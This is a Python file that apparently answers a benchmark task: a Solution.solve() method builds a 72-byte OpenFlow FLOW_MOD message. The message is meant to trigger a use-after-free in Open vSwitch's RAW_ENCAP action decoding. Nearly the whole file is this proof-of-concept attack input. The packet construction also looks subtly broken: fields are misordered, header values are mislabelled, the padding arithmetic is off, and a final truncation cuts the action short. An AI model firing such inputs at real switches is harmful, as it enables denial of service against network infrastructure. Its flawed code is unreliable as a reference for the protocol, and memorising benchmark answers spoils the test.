import os
import tempfile
import tarfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This is a minimal PoC for the RAW_ENCAP use-after-free vulnerability.
        # The vulnerability occurs when decode_ed_prop() reallocates the buffer
        # but decode_NXAST_RAW_ENCAP continues using the old pointer.
        # We need to create an OpenFlow RAW_ENCAP action that triggers buffer reallocation.
        
        # Structure based on Open vSwitch's nx_action_encap:
        # - nx_action_header (8 bytes)
        # - payload
        
        # Build a minimal OpenFlow packet with RAW_ENCAP action
        # that will cause decode_ed_prop to reallocate
        
        # OpenFlow 1.3+ message structure
        ofp_version = 0x04  # OpenFlow 1.3
        ofp_type = 0x10     # OFPT_FLOW_MOD
        length = 72         # Total length
        xid = 0x00000001
        
        # Flow mod structure
        cookie = 0x0000000000000000
        cookie_mask = 0x0000000000000000
        table_id = 0x00
        command = 0x00  # OFPFC_ADD
        idle_timeout = 0x0000
        hard_timeout = 0x0000
        priority = 0x0000
        buffer_id = 0xffffffff
        out_port = 0x00000000
        out_group = 0x00000000
        flags = 0x0000
        pad = 0x0000
        
        # Action structure for RAW_ENCAP
        # NXAST_RAW_ENCAP action type
        nx_action_header = struct.pack('!HHIHH', 
            0xffff,  # vendor (ONF)
            0x0002,  # action type (NXAST_RAW_ENCAP)
            72 - 40, # length (action size)
            0x0000,  # experimenter (0 for ONF)
            0x0000   # subtype
        )
        
        # encap structure that will be freed
        # We need to create a property list that will cause reallocation
        encap_header = struct.pack('!HH', 0x0000, 0x0000)  # ethertype and pad
        
        # Property header that triggers reallocation
        # Property type 0x0000 with length that causes buffer growth
        prop_header = struct.pack('!HH', 0x0000, 64)  # type and length
        
        # Fill with data to reach 72 bytes total
        # The key is to have a property that's large enough to trigger reallocation
        # when decode_ed_prop processes it
        prop_data = b'A' * (72 - 40 - 4)  # Fill remaining space
        
        # Assemble the action
        action_data = nx_action_header + encap_header + prop_header + prop_data
        
        # Assemble the full OpenFlow message
        ofp_header = struct.pack('!BBHI', ofp_version, ofp_type, length, xid)
        
        # Match structure (minimal match with OFPXMT_OFB_IN_PORT)
        match = struct.pack('!HHBBBB',
            0x0001,  # OFPMT_OXM
            4,       # length
            0x80,    # OXM class (OpenFlow basic)
            0x00,    # OXM field (in_port)
            1,       # has mask, length
            0x00     # pad
        ) + struct.pack('!I', 0x00000001)  # in_port value
        
        # Pad match to 8 bytes
        match_pad = b'\x00' * (8 - ((len(match) + 7) % 8))
        match += match_pad
        
        # Assemble flow mod
        flow_mod = struct.pack('!QQBBHHHIIIHH',
            cookie, cookie_mask, table_id, command,
            idle_timeout, hard_timeout, priority, buffer_id,
            out_port, out_group, flags, pad
        )
        
        # Assemble the complete packet
        poc = (ofp_header + 
               match +
               flow_mod +
               action_data)
        
        # Ensure exact 72 bytes
        poc = poc[:72]
        
        return poc
